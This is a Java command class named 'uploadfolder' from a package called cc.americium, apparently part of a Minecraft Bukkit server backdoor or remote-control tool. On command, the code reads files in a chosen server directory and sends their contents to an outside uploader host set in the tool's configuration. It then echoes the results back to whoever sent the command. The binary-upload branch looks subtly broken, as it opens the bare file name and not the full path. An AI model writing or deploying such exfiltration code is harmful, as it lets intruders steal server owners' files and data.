package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;

public class Uploadfolder implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"uploadfolder"};
    }

    @Override
    public String getDescription() {
        return "Upload all files in a directory.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "uploadfolder <file>");
            return;
        }

        String folderFilename = String.join(" ", args);
        File foundFolder = new File(folderFilename);

        if (!foundFolder.exists() || !foundFolder.isDirectory()) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That file doesn't exist / isn't a directory!");
            return;
        }

        if(foundFolder.listFiles().length > 5) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "There are more than 5 files in that directory! Use the zip command instead.");
            return;
        }

        for (File file : foundFolder.listFiles()) {
            if (file.isDirectory()) {
                continue;
            }

            String filename = file.getName();
            if (filename.endsWith(".txt") || filename.endsWith(".yml") || filename.endsWith(".yaml") || filename.endsWith(".json")) {
                ArrayList<String> lines = new ArrayList<>();

                try (BufferedReader br = new BufferedReader(new FileReader(file.getPath()))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        lines.add(line);
                    }
                } catch (IOException e) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + file.getPath() + " -> " + e.getMessage() + " (reading lines)");
                    continue;
                }

                if (lines.size() == 0) {
                    continue;
                }

                BufferedReader reader;

                try {
                    reader = Utilities.uploadFile(String.join("\n", lines), context.getZ_(), "endpoint");
                } catch (IOException e) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + file.getPath() + " -> " + e.getMessage() + " (uploading lines)");
                    continue;
                }

                String sb = Utilities.getStringFromBuffer(reader);

                if (sb.length() == 0) {
                    continue;
                }

                sender.sendMessage(Colors.Prefix + Colors.Caution + sb);
                continue;
            }

            BufferedReader reader;

            try {
                reader = upload(filename, context.getZ_());
            } catch (IOException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + file.getPath() + " -> " + e.getMessage() + " (upload file)");
                continue;
            }

            String sb = Utilities.getStringFromBuffer(reader);

            if (sb.length() == 0) {
                continue;
            }

            sender.sendMessage(Colors.Prefix + Colors.Caution + sb);
        }
    }

    private BufferedReader upload(String filepath, Z_ z) throws IOException {
        String charset = "UTF-8";
        File binaryFile = new File(filepath);
        String boundary = Long.toHexString(System.currentTimeMillis()); // Just generate some unique random value.
        String CRLF = "\r\n"; // Line separator required by multipart/form-data.

        URLConnection conn = new URL(z.uploader + "/file").openConnection();
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        OutputStream output = conn.getOutputStream();
        PrintWriter writer = new PrintWriter(new OutputStreamWriter(output, charset), true);

        writer.append("--").append(boundary).append(CRLF);
        writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(binaryFile.getName()).append("\"").append(CRLF);
        writer.append("Content-Type: ").append(URLConnection.guessContentTypeFromName(binaryFile.getName())).append(CRLF);
        writer.append("Content-Transfer-Encoding: binary").append(CRLF);
        writer.append(CRLF).flush();
        Files.copy(binaryFile.toPath(), output);
        output.flush();
        writer.append(CRLF).flush();

        writer.append("--").append(boundary).append("--").append(CRLF).flush();

        return new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
    }
}
